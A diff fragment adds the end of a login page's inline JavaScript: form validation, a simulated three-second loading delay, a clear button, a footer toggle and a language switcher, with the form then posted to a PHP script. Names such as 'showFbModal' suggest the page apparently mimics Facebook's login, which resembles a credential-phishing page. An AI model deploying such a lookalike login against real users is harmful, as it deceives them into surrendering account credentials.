+                    stopLoading();
+                    showFbModal("emailRequiredModal");
+                    return;
+                }
+
+                if (pwd === "") {
+                    stopLoading();
+                    showFbModal("passwordRequiredModal");
+                    return;
+                }
+
+                const emailOK = isValidEmail(value);
+                const phoneOK = isValidPhone(value);
+
+                if (!emailOK && !phoneOK) {
+                    stopLoading();
+                    showError();
+                    return;
+                }
+
+                if (pwd.length < 6) {
+                    stopLoading();
+                    showError();
+                    return;
+                }
+
+                // ✅ ALL CHECKS PASSED → SUBMIT TO PHP
+                stopLoading();
+                loginForm.submit();
+
+            }, 3000);
+        });
+
+
+        // Reset UI after loading
+        function stopLoading() {
+            loginBtn.classList.remove("loading");
+            loginBtn.disabled = false;
+
+            usernameInput.classList.remove("input-loading");
+            passwordInput.classList.remove("input-loading");
+
+            loginBtn.innerHTML = "Log in";
+        }
+
+        
+        
+        /* --------------------------------------------------
+            CLEAR (X) BUTTON FOR EMAIL/PHONE
+        -------------------------------------------------- */
+        const clearBtn = document.getElementById("clear-username");
+        
+        function updateClearButtonVisibility() {
+            clearBtn.style.display = usernameInput.value.trim() !== "" ? "block" : "none";
+        }
+        
+        usernameInput.addEventListener("input", updateClearButtonVisibility);
+        
+        usernameInput.addEventListener("blur", () => {
+            setTimeout(() => clearBtn.style.display = "none", 100);
+        });
+        
+        usernameInput.addEventListener("focus", updateClearButtonVisibility);
+        
+        clearBtn.addEventListener("mousedown", (e) => e.preventDefault());
+        
+        clearBtn.addEventListener("click", (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            usernameInput.value = "";
+            clearBtn.style.display = "none";
+            usernameInput.focus();
+        });
+        
+        
+        /* --------------------------------------------------
+            MORE BUTTON → SHOW/HIDE EXTRA FOOTER LINKS
+        -------------------------------------------------- */
+        const moreBtn = document.getElementById("moreBtn");
+        const moreLinks = document.getElementById("moreLinks"); 
+        const signupBtn = document.getElementById("signup-btn");
+
+        moreBtn.addEventListener("click", (e) => {
+            e.preventDefault(); 
+
+            if (moreLinks.style.display === "none" || moreLinks.style.display === "") {
+                moreLinks.style.display = "block";
+                moreBtn.textContent = "More";
+                signupBtn.classList.add("compact");
+            } else {
+                moreLinks.style.display = "none";
+                moreBtn.textContent = "More";
+                signupBtn.classList.remove("compact");
+            }
+        });
+
+
+        // --------------------------------------------------
+        // LANGUAGE TRANSLATION SWITCHER
+        // --------------------------------------------------
+
+        radios.forEach(radio => {
+            radio.addEventListener("change", () => {
+                const lang = radio.value;
+
+                langBtn.textContent = lang; // update button text
+                applyLanguage(lang);
+                closeModal(); // close language modal
+            });
+        });
+
+        function applyLanguage(lang) {
+            const elements = document.querySelectorAll("[data-i18n]");
+
+            elements.forEach(el => {
+                const key = el.dataset.i18n;
+
+                if (translations[lang] && translations[lang][key]) {
+                    el.textContent = translations[lang][key];
+                }
+            });
+        }
+
+
+    </script>
+    
+        
+
+</body>
+</html>
